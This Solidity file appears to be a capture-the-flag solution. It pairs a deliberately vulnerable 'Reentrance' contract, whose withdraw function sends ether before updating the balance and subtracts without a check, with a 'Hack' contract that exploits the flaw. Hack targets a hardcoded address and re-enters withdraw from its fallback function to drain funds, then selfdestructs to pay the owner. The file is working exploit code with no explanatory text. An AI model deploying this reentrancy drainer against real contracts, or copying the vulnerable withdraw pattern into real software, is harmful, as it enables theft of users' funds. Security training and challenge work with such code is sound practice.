// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Hack {
   
    address owner;
  
   
    constructor () public payable {   
    
        owner = msg.sender; 
       
    }
    
    function attack() public payable {
        Reentrance(0x9F99De71c5829072E08d3913D4d088F7f88a2c92).donate{value:100000000000000000}(address(this));
        Reentrance(0x9F99De71c5829072E08d3913D4d088F7f88a2c92).withdraw(0.1 ether);
    }
   
   
    fallback() external payable {
         Reentrance(0x9F99De71c5829072E08d3913D4d088F7f88a2c92).withdraw(0.1 ether);
    }

    function ethBalance(address _who) public view returns(uint) {
      return _who.balance;
    }
    
  
    function kill () public {
        require(msg.sender == owner);
        selfdestruct(payable(owner));
    }
}